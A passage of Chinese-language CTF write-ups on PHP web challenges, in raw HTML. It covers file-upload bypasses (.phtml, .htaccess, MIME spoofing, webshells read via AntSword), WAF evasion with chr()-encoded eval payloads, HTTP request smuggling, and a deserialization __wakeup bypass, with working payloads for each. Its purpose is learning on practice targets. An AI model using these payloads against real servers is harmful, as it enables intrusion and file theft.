/&gt;payload：POST：upload/11.phtml，POST：</code></pre>c=echo `cat /flag`;<pre><code class="hljs">## [ACTF2020 新生赛]Upload### 考点：php常见后缀解析绕过&gt; [参考WP](https://www.cnblogs.com/yesec/p/12403922.html)查看源码```html &lt;div class=&quot;light&quot;&gt;&lt;span class=&quot;glow&quot;&gt;&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;嘿伙计，你发现它了！                &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;                &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;/&gt;            &lt;/form&gt;      &lt;/span&gt;&lt;span class=&quot;flare&quot;&gt;&lt;/span&gt;&lt;div&gt;</code></pre></code></pre></li></ul></li></ol><p><strong><em><a href="https://blog.csdn.net/YoungStar70/article/details/64934435">onsubmit</a>表示表单提交时验证的事件,它是在表单中的确认按钮被点击时出发的，一般是js函数，函数返回其他值/不返回表单内容才能提交，函数返回false表单不会提交</em></strong>（<a href="https://zhidao.baidu.com/question/111968742.html">百度知道</a>）</p><p>前端对文件后缀有限制，审查元素删掉也不行</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214154853790.png" alt="image-20220214154853790" style="zoom: 50%;"><p>上传图片马，发现对上传后的文件重命名了</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214155009513.png" alt="image-20220214155009513" style="zoom: 67%;"><p>直接访问，发现是图片</p><p>修改后缀名为11.phtml，上传成功，访问网页成功解析php</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214163807480.png" alt="image-20220214163807480" style="zoom:67%;"><p>POST访问uplo4d/87226c8336e7d8806fd8d3324fbcda6b.phtml</p><pre><code class="hljs ebnf"><span class="hljs-attribute">c</span>=echo <span class="hljs-string">`cat  /flag`</span>;</code></pre><p>得到flag</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214163848001.png" alt="image-20220214163848001" style="zoom: 50%;"><p>蚁剑连接后查看源码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    error_reporting(<span class="hljs-number">0</span>);    <span class="hljs-comment">//设置上传目录</span>    define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-string">&quot;./uplo4d&quot;</span>);    $msg = <span class="hljs-string">&quot;Upload Success!&quot;</span>;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];        $file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];        $ext = pathinfo($file_name,PATHINFO_EXTENSION);  <span class="hljs-comment">//规定新的文件后缀名为源文件后缀名</span>        <span class="hljs-keyword">if</span>(in_array($ext, [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>])) &#123;   <span class="hljs-comment">//这里不出所料,过滤了常见的php文件拓展名</span>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;nonono~ Bad file！&#x27;</span>);        &#125;        $new_file_name = md5($file_name).<span class="hljs-string">&quot;.&quot;</span>.$ext;    <span class="hljs-comment">//新的文件名为md5值加上后缀名</span>        $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . $new_file_name;        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;            $is_upload = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&#x27;Upload Failed!&#x27;</span>;        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.$msg.<span class="hljs-string">&quot; Look here~ &quot;</span>.$img_path.<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;    &#125;<span class="hljs-meta">?&gt;</span></code></pre><blockquote><p><strong><em><a href="https://www.runoob.com/php/func-filesystem-pathinfo.html">pathinfo()</a> 函数以数组的形式返回关于文件路径的信息。</em></strong></p><p>语法：pathinfo(path,options)，opyions里的PATHINFO_EXTENSION - 只返回 extension</p></blockquote><p>从源码中可以看出只对上传后的文件更名并移到upload目录下，并没有删除</p><h4 id="总结一下CTF文件上传题中常见考点"><a href="#总结一下CTF文件上传题中常见考点" class="headerlink" title="总结一下CTF文件上传题中常见考点"></a>总结一下CTF文件上传题中常见考点</h4><ul><li>利用中间件解析漏洞绕过检查，实战常用</li><li>上传.user.ini或.htaccess将合法拓展名文件当作php文件解析</li><li>%00截断绕过</li><li>php3后缀解析</li><li>php4文件</li><li>php5文件</li><li>php7文件</li><li>phtml文件</li><li>phps文件</li><li>pht文件</li></ul><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><h3 id="考点：-htaccess、mime-后缀"><a href="#考点：-htaccess、mime-后缀" class="headerlink" title="考点：.htaccess、mime+后缀"></a>考点：.htaccess、mime+后缀</h3><p>上传一句话，图片马都不行，后端验证</p><p>那就上传.htaccess文件，**==修改mime为 image/jpeg==<strong>，发现成功上传，这样就可以让 **jpg</strong> 解析为 <strong>php</strong> </p><blockquote><p><strong><a href="https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html">htaccess</a>文件是Apache服务器中的一个配置文件，它负责所在目录下的网页解析配置</strong></p><p><strong>.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，且子目录中的指令会覆盖父目录或者主配置文件中的指令</strong></p></blockquote><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214174709873.png" alt="image-20220214174709873" style="zoom:67%;"><p>上传一个一句话木马php文件</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175230427.png" alt="image-20220214175230427" style="zoom: 80%;"><p>修改后缀、mime，成功上传</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175305517.png" alt="image-20220214175305517" style="zoom:67%;"><p>成功访问</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175337259.png" alt="image-20220214175337259" style="zoom: 50%;"><p>蚁剑连接得到flag，不知道为啥直接hackbar shell=echo `cat /flag` 不行</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175930523.png" alt="image-20220214175930523" style="zoom:67%;"><p>源码分析，对后缀有限制：含ph就不行，对文件类型即mime有限制，得是image类，对大小也有限制，然后就直接输出文件内容，把上传的文件移动到新目录下</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>session_start();<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;    $_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>] = md5((<span class="hljs-keyword">string</span>)time() . (<span class="hljs-keyword">string</span>)rand(<span class="hljs-number">100</span>, <span class="hljs-number">1000</span>));&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>])) &#123;    $target_path  = getcwd() . <span class="hljs-string">&quot;/upload/&quot;</span> . md5($_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]);  <span class="hljs-comment">//getcwd在这里是/var/www/html</span>    $t_path = $target_path . <span class="hljs-string">&quot;/&quot;</span> . basename($_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//$t_path是/var/www/html+md5+文件名</span>    $uploaded_name = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];  <span class="hljs-comment">//文件全名，包含后缀</span>    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,<span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);  <span class="hljs-comment">//后缀为最后一个点后面的</span>    $uploaded_size = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];    $uploaded_tmp  = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];     <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ph/i&quot;</span>, strtolower($uploaded_ext)))&#123;  <span class="hljs-comment">//不区分大小写，遇到含ph的后缀就die</span>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我扌your problem?&quot;</span>);    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span> ((($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;</span><span class="hljs-string">            &quot;</span>) || ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpeg&quot;</span>) || ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/pjpeg&quot;</span>)|| ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/png&quot;</span>)) &amp;&amp; ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &lt; <span class="hljs-number">2048</span>))&#123;            $content = file_get_contents($uploaded_tmp);  <span class="hljs-comment">//输出临时文件内容</span>mkdir(iconv(<span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;GBK&quot;</span>, $target_path), <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);move_uploaded_file($uploaded_tmp, $t_path);  <span class="hljs-comment">//移动临时文件到/var/www/html+md5+文件</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我扌your problem?&quot;</span>);        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>getcwd():获取当前目录，在这里是/var/www/html</p><p>getcwd()返回URL中引用的“main”脚本的路径。</p><p>dirname(<strong>FILE</strong>)将返回当前执行脚本的路径。</p><p><strong><a href="https://www.php.cn/php-weizijiaocheng-415346.html">basename()</a>函数用于返回文件路径中的文件名部分</strong></p><ul><li><p>$file = “/phpstudy/WWW/index.php”;</p></li><li><p>echo basename($file);//带有文件扩展名  index.php</p></li><li><p>echo basename($file,’.php’); //去除文件扩展名  index</p></li></ul><p>strrpos() 函数查找字符串在另一字符串中<strong>最后一次</strong>出现的位置（区分大小写）</p><p>strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</p><p>substr() 函数返回字符串第二个参数开始（包括）的后半部分。</p><p>文件上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><h3 id="考点：php-waf字符串解析特性绕过、php扫目录scandir、读文件readfile、编码绕过ascii"><a href="#考点：php-waf字符串解析特性绕过、php扫目录scandir、读文件readfile、编码绕过ascii" class="headerlink" title="考点：php+waf字符串解析特性绕过、php扫目录scandir、读文件readfile、编码绕过ascii"></a>考点：php+waf字符串解析特性绕过、php扫目录scandir、读文件readfile、编码绕过ascii</h3><blockquote><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">csdn wp</a></p><p><a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">参考个人博客wp</a></p></blockquote><p>输入字符被403</p><p><strong>返回403？一般都是PHP过滤的。这里403.应该就是题目说的WAF了</strong><br><strong>那么整个处理流程应该是。前端服务器WAF过滤。-&gt;后端PHP黑名单过滤</strong></p><p>查看源码</p><pre><code class="hljs javascript">$(<span class="hljs-string">&#x27;#calc&#x27;</span>).submit(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;    $.ajax(&#123;        url:<span class="hljs-string">&quot;calc.php?num=&quot;</span>+<span class="hljs-built_in">encodeURIComponent</span>($(<span class="hljs-string">&quot;#content&quot;</span>).val()), <span class="hljs-comment">//获取标签的值并进行url编码</span>        type:<span class="hljs-string">&#x27;GET&#x27;</span>,        success:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;            $(<span class="hljs-string">&quot;#result&quot;</span>).html(<span class="hljs-string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span><span class="hljs-string">        &lt;strong&gt;答案:&lt;/strong&gt;<span class="hljs-subst">$&#123;data&#125;</span></span><span class="hljs-string">        &lt;/div&gt;`</span>);        &#125;,        error:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;            alert(<span class="hljs-string">&quot;这啥?算不来!&quot;</span>);        &#125;    &#125;)    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;)</code></pre><p>calc.php?num=”+encodeURIComponent($(“#content”).val()是什么意思？</p><p>(“#content”)相当于document.getElementById(“content”);获取id为content的HTML标签元素</p><p>而(“#content”).val() 相当于document.getElementById(“content”).value;获取id为content的HTML标签元素的值</p><p>encodeURIComponent(str);将字符串url编码</p><p>访问calc.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-comment">//num没有值就返回calc源码</span>&#125;<span class="hljs-keyword">else</span>&#123;        $str = $_GET[<span class="hljs-string">&#x27;num&#x27;</span>];        $blacklist = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];        <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . $blackitem . <span class="hljs-string">&#x27;/m&#x27;</span>, $str)) &#123;                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);                &#125;        &#125;        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.$str.<span class="hljs-string">&#x27;;&#x27;</span>);  <span class="hljs-comment">//已有echo</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>正则表达式模式修饰符 m：多行匹配，不受\n影响</p><p>尝试字母，forbidden，<strong>特殊字符好像就直接页面错误，，这应该是waf！！！</strong></p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214213717838.png" alt="image-20220214213717838" style="zoom:67%;"><h4 id="PHP的字符串解析特性"><a href="#PHP的字符串解析特性" class="headerlink" title="PHP的字符串解析特性"></a>PHP的字符串解析特性</h4><ol><li><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。</p></li><li><p>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：<code>/news.php?%20news[id%00=42&quot;+AND+1=0–</code>(<strong>waf识别出参数是%20news[id%00而不是目标参数而不去拦截，实际到php那里，参数是news_id</strong>)</p></li><li><p>php需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p></li></ol><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>删除空白符<span class="hljs-number">2.</span>将某些字符转换为下划线（包括空格）</code></pre><ol start="4"><li>那么如果waf不允许num变量传递字母：</li></ol><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.xxx.com<span class="hljs-regexp">/index.php?num = aaaa   /</span><span class="hljs-regexp">/显示非法输入的话</span></code></pre><p>那么我们可以在num前加个空格：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.xxx.com/index.php? num = aaaa</code></pre><p>waf以为是 num参数而不去拦截，而php解析出num参数赋值</p><p>、==》成功绕过waf</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214215614832.png" alt="image-20220214215614832" style="zoom:67%;"><p>scandir()：函数返回一个数组，其中包含指定路径中的文件和目录，不会回显</p><p>==需要配合<strong>print_r</strong>或<strong>var_dump</strong>输出数组==</p><p><strong>由于“/”被过滤了，所以我们可以使用chr(47)来进行表示，进行目录读取</strong>【/的ASCII:47】</p><p>payload：</p><ol><li>读取根目录</li></ol><pre><code class="hljs reasonml">/calc.php? num=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">chr</span>(47)</span>));</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214230658219.png" alt="image-20220214230658219"></p><ol start="2"><li>读取flag？屏蔽了``，不能命令执行，php读文件函数：<strong>file_get_contents</strong></li></ol><ul><li><strong><em>file_get_contents() 把整个文件内容读入一个字符串中。<span style="background:#FF9999;">函数返回读取到的数据，</span></em></strong>，而原php代码已有echo，无需再打印</li><li><strong>PHP使用 标准的 点 连接符拼接</strong></li><li>payload:</li></ul><pre><code class="hljs angelscript">/calc.php?%<span class="hljs-number">20</span>num=var_dump(file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>)));/calc.php?%<span class="hljs-number">20</span>num=file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>));即file_get_contents(/f1agg)</code></pre><p>或者</p><p>scandir可以用base_convert函数构造，但是利用base_convert只能解决<code>a~z</code>的利用，因为根目录需要/符号，且不在<code>a~z</code>,所以需要hex2bin(dechex(47))这种构造方式，dechex()函数把十进制数转换为十六进制数。hex2bin()函数把十六进制值的字符串转换为 ASCII字符,用readfile读取文件</p><ul><li><strong><em>readfile()函数: 输出一个文件。**<br>**该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</em></strong></li></ul><p>payload:</p><pre><code class="hljs angelscript">base_convert(<span class="hljs-number">2146934604002</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(hex2bin(dechex(<span class="hljs-number">47</span>)).base_convert(<span class="hljs-number">25254448</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>))即readfile(/f1agg)</code></pre><p>Q1：其他的函数如system执行系统命令可以吗？不行，因为phpinfo里可以看到禁用了<strong>system、exec 这一类命令执行的函数</strong></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214232523093.png" alt="image-20220214232523093"></p><h4 id="Q2：HTTP走私攻击"><a href="#Q2：HTTP走私攻击" class="headerlink" title="Q2：HTTP走私攻击"></a>Q2：HTTP走私攻击</h4><blockquote><p><a href="https://paper.seebug.org/1048/">**协议层的攻击——HTTP请求走私，seebug介绍</a></p><p><a href="https://mayi077.gitee.io/2020/01/24/RoarCTF-2019-Easy-Calc/">相关WP1</a></p><p><a href="https://guokeya.github.io/post/4e7t6Raji/">WP2</a></p><p><a href="https://guokeya.github.io/post/AQdKm74xy/">**各分类介绍和例题</a></p></blockquote><p><strong>TE-CL</strong></p><p>前端根据TE来解析。所有请求都被算上了<br>后端根据CL来解析。22\r\n被解析。GET /admin就成了新的请求</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/1579173913376.png"></p><p><strong>CL-CL</strong></p><p>当代理服务器和后端服务器接收多个CL。返回400错误。代理服务器使用第一个CL处理数据。后端服务器使用第二个CL处理数据【<strong>数据到达服务器端</strong>】</p><p>这里GET/POST都可以</p><p><img src="https://guokeya.github.io/post-images/1579177518794.png"></p><p><img src="https://pic.downk.cc/item/5e2968b82fb38b8c3c43771b.jpg" alt="大佬图片"></p><p>CL-CL：在这题大概意思是一个消息同时加上两个Content-Length，POST请求+GET请求url参数，会导致400报错，前端接受的是POST请求，但是get请求到了后端，服务器端会回显get结果</p><p>Q3:字符串转ASCII，php：不能直接转，除非工具，需要挨个字符转，chr()，再<code>.</code>连接起来</p><blockquote><p><a href="https://evilcos.me/lab/xssor/">https://evilcos.me/lab/xssor/</a></p></blockquote><p>先转10en，再替换,为).chr(</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><h3 id="考点：备份、php反序列化、跳过-wakeup"><a href="#考点：备份、php反序列化、跳过-wakeup" class="headerlink" title="考点：备份、php反序列化、跳过__wakeup()"></a>考点：备份、php反序列化、跳过__wakeup()</h3><p><span style="background:#FF9999;">属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</span></p><p>提示网站备份，访问<a href="http://www.zip,得到源码和假flag/">www.zip，得到源码和假flag</a></p><p><a href="https://blog.csdn.net/qq_35599248/article/details/119396936">dirsearch</a>参数解析</p><pre><code class="hljs diff"><span class="hljs-deletion">-i         保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)</span><span class="hljs-deletion">-w,--wordlists              自定义wordlist(以逗号分隔</span><span class="hljs-deletion">-e,--extensions             包含的文件拓展名(逗号分隔) /指定网站语言  如-e php,asp</span><span class="hljs-deletion">-u,--url                    目标url</span></code></pre><p>index.php关键php：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;$select = $_GET[<span class="hljs-string">&#x27;select&#x27;</span>];$res=unserialize(@$select);   <span class="hljs-comment">//①  res为对象</span><span class="hljs-meta">?&gt;</span></code></pre><p>反序列化：new创造对象时触发construct构造函数，unserialize时触发wakeup，结束后触发destruct析构函数</p><p>class.php:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&#x27;nonono&#x27;</span>;    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&#x27;yesyes&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = $username;        <span class="hljs-keyword">$this</span>-&gt;password = $password;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">//②</span>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">//③</span>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;  <span class="hljs-comment">//绕过这里</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;            <span class="hljs-keyword">die</span>();        &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;   <span class="hljs-comment">//关键点  ④</span>            <span class="hljs-keyword">global</span> $flag;  <span class="hljs-comment">//可以变量覆盖</span>            <span class="hljs-keyword">echo</span> $flag;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;            <span class="hljs-keyword">die</span>();        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>关键：</p><pre><code class="hljs elixir">不满足<span class="hljs-variable">$this</span>-&gt;password != <span class="hljs-number">100</span>满足<span class="hljs-variable">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>但是第②步的时候username被初始化变为了guest</code></pre><p><strong>问题就来了，在反序列化的时候会首先执行</strong><code>__wakeup()</code><strong>魔术方法，但是这个方法会把我们的username重新赋值，所以我们要考虑的就是怎么跳过</strong><code>__wakeup()</code><strong>，而去执行</strong><code>__destruct</code>——==属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行==</p><p>构造序列化：最完整：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&#x27;nonono&#x27;</span>;    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&#x27;yesyes&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = $username;        <span class="hljs-keyword">$this</span>-&gt;password = $password;    &#125;&#125;$a = <span class="hljs-keyword">new</span> Name(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-number">100</span>);var_dump(serialize($a));<span class="hljs-meta">?&gt;</span></code></pre><p>private版执行结果</p><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;修改属性个数：<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre><p>简洁:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<span class="hljs-keyword">public</span> $username=<span class="hljs-string">&#x27;admin&#x27;</span>;<span class="hljs-keyword">public</span> $password= <span class="hljs-number">100</span>;&#125; $flag = <span class="hljs-keyword">new</span> Name();$flag_1 = serialize($flag);<span class="hljs-keyword">echo</span> 